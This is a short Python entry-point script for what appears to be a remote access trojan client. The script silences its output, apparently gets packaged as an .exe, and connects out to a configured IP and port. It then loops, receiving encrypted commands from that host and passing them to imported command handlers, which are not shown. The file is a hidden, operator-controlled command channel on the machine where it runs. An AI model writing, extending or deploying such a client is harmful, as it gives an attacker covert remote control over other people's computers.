import multiprocessing
import contextlib
import socket
import os

from foreign.parse.crash_exception_handling import *
from foreign.parse.command_handling import *
from binary.data_handling.recv_data import *
from foreign.utility.program_setup import *
from foreign.global_state import *


@crash_exception_handling
def main():
  state['file'] = '{}/{}'.format(os.getcwd().replace('\\', '/'), __file__.replace('.py', '.exe'))
  program_setup()

  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((state['ip'], state['port']))

  while True:
    recv_data(s, (state['settings']['encryption'], state['settings']['headersize']), command_handling)


if __name__ == '__main__':
  with open(os.devnull, 'w') as devnull:
    with contextlib.redirect_stdout(devnull):
      multiprocessing.freeze_support()
      main()